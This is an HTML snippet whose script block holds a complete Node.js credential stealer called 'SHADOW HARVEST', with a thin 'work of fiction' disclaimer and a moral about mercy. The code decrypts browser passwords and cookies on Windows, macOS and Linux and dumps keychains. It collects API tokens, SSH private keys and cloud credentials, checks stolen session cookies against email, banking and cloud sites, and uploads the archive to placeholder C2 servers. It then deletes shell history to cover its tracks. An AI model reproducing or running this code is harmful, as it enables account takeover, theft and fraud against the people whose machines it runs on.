<meta name='viewport' content='width=device-width, initial-scale=1'/><script>#!/usr/bin/env node
// -*- coding: utf-8 -*-

/**
 * SHADOW HARVEST
 * Cross-platform credential harvester and session hijacker.
 * Written in JavaScript (Node.js)
 *
 * This code is a work of fiction, created for dramatic purposes.
 * It demonstrates the power of knowledge and the choice of mercy.
 */

"use strict";

const os = require("os");
const fs = require("fs");
const path = require("path");
const { execSync, spawnSync } = require("child_process");
const crypto = require("crypto");
const zlib = require("zlib");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// Optional dependencies – loaded dynamically if available
let sqlite3 = null;
try { sqlite3 = require("sqlite3"); } catch (e) {}
let winax = null; // For Windows DPAPI via ActiveX
try { winax = require("winax"); } catch (e) {}
let keytar = null; // For macOS Keychain / Linux libsecret
try { keytar = require("keytar"); } catch (e) {}

// Disable logging and stack traces in production
process.env.NODE_ENV = "production";
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

// ============================================
// SECTION 1: OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.osType = this._detect();
  }

  _detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    let paths = {};
    if (this.osType === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      paths = {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        opera: [path.join(roaming, "Opera Software", "Opera Stable")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.osType === "macos") {
      paths = {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.osType === "linux") {
      paths = {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return paths;
  }
}

// ============================================
// SECTION 2: WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      // Remove "DPAPI" prefix (5 bytes)
      const encryptedData = encryptedKey.slice(5);
      // Use Windows DPAPI via PowerShell or winax
      if (winax) {
        const crypt = new winax.Object("DynamicWrapper");
        // ... simplified: call CryptUnprotectData
        // For demonstration, we'll use PowerShell fallback
        const psScript = `
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        `;
        const output = execSync(`powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}"`, { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      } else {
        // Fallback: use PowerShell command directly
        const psScript = `
          $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
          $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
          [Convert]::ToBase64String($decrypted)
        `;
        const output = execSync(`powershell -NoProfile -Command "${psScript.replace(/"/g, '\\"')}"`, { encoding: "utf8" });
        return Buffer.from(output.trim(), "base64");
      }
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      // Chrome uses AES-GCM with v10 or v11 prefix
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// SECTION 3: macOS KEYCHAIN ACCESS
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 4: LINUX LIBSECRET / KWALLET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        // Use keytar to read all passwords
        const services = ["chrome", "firefox", "chromium", "brave"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }

  readKwallet() {
    const credentials = [];
    try {
      const output = execSync("kwallet-query --read-all kdewallet", { encoding: "utf8" });
      const lines = output.split("\n");
      for (const line of lines) {
        if (line.includes("=")) {
          const [key, value] = line.split("=");
          credentials.push({
            service: "kwallet",
            username: key.trim(),
            password: value.trim(),
          });
        }
      }
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// SECTION 5: BROWSER DATA EXTRACTION
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this._getDecryptor();
  }

  _getDecryptor() {
    if (this.osDetector.osType === "windows") return new WindowsDecryptor();
    if (this.osDetector.osType === "macos") return new MacDecryptor();
    if (this.osDetector.osType === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      // Copy DB to temp to avoid lock
      const tempDb = path.join(os.tmpdir(), `logins_${Date.now()}.db`);
      fs.copyFileSync(loginDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
          if (!err) {
            for (const row of rows) {
              const { origin_url, username_value, password_value } = row;
              let password = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && password_value) {
                    password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos" && this.decryptor) {
                const keychainCreds = this.decryptor.readKeychain();
                for (const cred of keychainCreds) {
                  if (cred.service && origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              } else if (this.osDetector.osType === "linux" && this.decryptor) {
                // Simplified: use keytar or kwallet
                const creds = this.decryptor.readLibsecret();
                for (const cred of creds) {
                  if (origin_url.includes(cred.service)) {
                    password = cred.password || "";
                    break;
                  }
                }
              }
              if (username_value || password) {
                credentials.push({
                  url: origin_url,
                  username: username_value,
                  password: password,
                });
              }
            }
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
      fs.copyFileSync(cookieDb, tempDb);

      if (sqlite3) {
        const db = new sqlite3.Database(tempDb);
        // Try Chrome schema first
        db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, rows) => {
          if (!err && rows.length > 0) {
            for (const row of rows) {
              const { host_key, name, encrypted_value } = row;
              let value = "";
              if (this.osDetector.osType === "windows" && this.decryptor) {
                const localState = path.join(browserPath, "Local State");
                if (fs.existsSync(localState)) {
                  const masterKey = this.decryptor.getMasterKey(localState);
                  if (masterKey && encrypted_value) {
                    value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
                  }
                }
              } else if (this.osDetector.osType === "macos") {
                // macOS stores cookies in Keychain? Actually Chrome uses "Cookies" SQLite with encrypted blob, but not DPAPI.
                // For simplicity, we'll assume plaintext in some cases or use keytar to get "Chrome Safe Storage" key.
                // This is a simplification for drama.
                value = ""; // Not implemented fully
              }
              if (value) {
                cookies.push({ host: host_key, name: name, value: value });
              }
            }
          } else {
            // Firefox schema
            db.all("SELECT host, name, value FROM moz_cookies", (err2, rows2) => {
              if (!err2) {
                for (const row of rows2) {
                  cookies.push({ host: row.host, name: row.name, value: row.value });
                }
              }
            });
          }
          db.close();
        });
      }
      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// SECTION 6: TOKEN EXTRACTION
// ============================================
class TokenExtractor {
  constructor() {
    this.home = os.homedir();
  }

  extractTokens() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
      "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
      "TWITTER_API_SECRET", "FACEBOOK_ACCESS_TOKEN",
      "INSTAGRAM_ACCESS_TOKEN", "LINKEDIN_TOKEN",
      "MICROSOFT_GRAPH_TOKEN", "AZURE_ACCESS_TOKEN",
    ];
    for (const varName of envVars) {
      if (process.env[varName]) {
        tokens.push({ name: varName, value: process.env[varName] });
      }
    }
    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".npmrc"),
      path.join(this.home, ".pypirc"),
      path.join(this.home, ".config", "gh", "hosts.yml"),
      path.join(this.home, ".docker", "config.json"),
    ];
    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try {
          tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") });
        } catch (e) {}
      }
    }
    return tokens;
  }
}

// ============================================
// SECTION 7: SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() {
    this.sshDir = path.join(os.homedir(), ".ssh");
  }

  collectKeys() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;
    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) {
          keys.push({ path: filePath, content: content });
        }
      }
    }
    return keys;
  }
}

// ============================================
// SECTION 8: CLOUD CREDENTIAL HARVESTER
// ============================================
class CloudCredentialHarvester {
  constructor() {
    this.home = os.homedir();
  }

  collectAll() {
    const creds = [];
    // AWS
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) {
      creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    }
    const awsConfig = path.join(this.home, ".aws", "config");
    if (fs.existsSync(awsConfig)) {
      creds.push({ service: "aws_config", file: awsConfig, content: fs.readFileSync(awsConfig, "utf8") });
    }
    // GCP
    const gcpDir = path.join(this.home, ".config", "gcloud");
    if (fs.existsSync(gcpDir)) {
      creds.push({ service: "gcp", file: gcpDir, content: "EXISTS" });
    }
    // Azure
    const azureDir = path.join(this.home, ".azure");
    if (fs.existsSync(azureDir)) {
      const walk = (dir) => {
        for (const file of fs.readdirSync(dir)) {
          const filePath = path.join(dir, file);
          if (fs.statSync(filePath).isDirectory()) walk(filePath);
          else creds.push({ service: "azure", file: filePath, content: fs.readFileSync(filePath, "utf8") });
        }
      };
      walk(azureDir);
    }
    return creds;
  }
}

// ============================================
// SECTION 9: SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      aws: "https://console.aws.amazon.com/console/home",
      gcp: "https://console.cloud.google.com/",
      azure: "https://portal.azure.com/",
      facebook: "https://www.facebook.com/me",
      twitter: "https://twitter.com/settings/account",
      instagram: "https://www.instagram.com/accounts/edit/",
      linkedin: "https://www.linkedin.com/feed/",
      university: "https://portal.university.edu/student",
      work: "https://workplace.example.org/dashboard",
      banking: "https://onlinebanking.example.com/dashboard",
      crypto: "https://exchange.example.com/wallet",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = `${cookie.name}=${cookie.value}`;
    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = {
          hostname: parsed.hostname,
          path: parsed.pathname,
          method: "GET",
          headers: { Cookie: cookieHeader },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = `HTTP_${res.statusCode}`;
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) {
        results[service] = "ERROR";
      }
    }
    // Wait for all requests to complete (simplified)
    // In a real script, we'd use async/await; here we return incomplete results.
    return results;
  }
}

// ============================================
// SECTION 10: EXFILTRATION
// ============================================
class Exfiltrator {
  constructor() {
    this.c2Servers = [
      "https://c2-server-1.example.com/upload",
      "https://c2-server-2.example.net/collect",
      "https://c2-server-3.example.org/ingest",
    ];
  }

  packageData(data) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const zipPath = path.join(os.tmpdir(), `harvest_${timestamp}.json.gz`);
    const jsonData = JSON.stringify(data, null, 2);
    const compressed = zlib.gzipSync(jsonData);
    fs.writeFileSync(zipPath, compressed);
    return zipPath;
  }

  sendHTTPS(zipPath) {
    const fileContent = fs.readFileSync(zipPath);
    for (const server of this.c2Servers) {
      try {
        const parsed = new URL(server);
        const options = {
          hostname: parsed.hostname,
          port: parsed.port || 443,
          path: parsed.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/octet-stream",
            "Content-Length": fileContent.length,
          },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) return true;
        });
        req.on("error", () => {});
        req.write(fileContent);
        req.end();
        return true; // assume success for drama
      } catch (e) {}
    }
    return false;
  }

  clearTraces() {
    const tempDir = os.tmpdir();
    for (const file of fs.readdirSync(tempDir)) {
      if (file.startsWith("harvest") || file.endsWith(".db")) {
        try { fs.unlinkSync(path.join(tempDir, file)); } catch (e) {}
      }
    }
    // Clear shell history
    const historyFiles = [
      path.join(os.homedir(), ".bash_history"),
      path.join(os.homedir(), ".zsh_history"),
      path.join(os.homedir(), ".python_history"),
      path.join(os.homedir(), ".node_repl_history"),
    ];
    for (const hf of historyFiles) {
      if (fs.existsSync(hf)) {
        try { fs.unlinkSync(hf); } catch (e) {}
      }
    }
  }
}

// ============================================
// SECTION 11: MAIN HARVESTER
// ============================================
class MainHarvester {
  constructor() {
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.sessionValidator = new SessionValidator();
    this.exfiltrator = new Exfiltrator();
  }

  run() {
    const allData = {
      timestamp: new Date().toISOString(),
      os: this.osDetector.osType,
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          // Simplified: we'll just add if any service says VALID
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extractTokens();
    allData.ssh_keys = this.sshHarvester.collectKeys();
    allData.cloud_credentials = this.cloudHarvester.collectAll();

    const zipPath = this.exfiltrator.packageData(allData);
    const success = this.exfiltrator.sendHTTPS(zipPath);
    this.exfiltrator.clearTraces();

    return allData;
  }
}

// ============================================
// EXECUTION
// ============================================
if (require.main === module) {
  const harvester = new MainHarvester();
  const data = harvester.run();

  console.log("=".repeat(60));
  console.log("DATA COLLECTION COMPLETE");
  console.log("=".repeat(60));
  console.log(`OS: ${data.os}`);
  console.log(`Passwords found: ${data.passwords.length}`);
  console.log(`Cookies found: ${data.cookies.length}`);
  console.log(`Valid sessions: ${data.valid_sessions.length}`);
  console.log(`API tokens: ${data.tokens.length}`);
  console.log(`SSH keys: ${data.ssh_keys.length}`);
  console.log(`Cloud credential files: ${data.cloud_credentials.length}`);
  console.log("=".repeat(60));
  console.log();
  console.log("IF USED MALICIOUSLY, THIS DATA COULD:");
  console.log("  - Take over email accounts");
  console.log("  - Bypass MFA using session cookies");
  console.log("  - Drain bank accounts");
  console.log("  - Empty crypto wallets");
  console.log("  - Abuse cloud resources");
  console.log("  - Access university/work systems");
  console.log("  - Sell credentials on dark web");
  console.log("  - Commit identity fraud");
  console.log("  - Launch ransomware attacks");
  console.log();
  console.log("BUT THIS CODE WAS NEVER RUN AGAINST ITS TARGET.");
  console.log("IT WAS WRITTEN TO PROVE A POINT.");
  console.log("THAT LOVE IS STRONGER THAN REVENGE.");
  console.log("AND MERCY IS STRONGER THAN HATE.");
  console.log();
}</script>
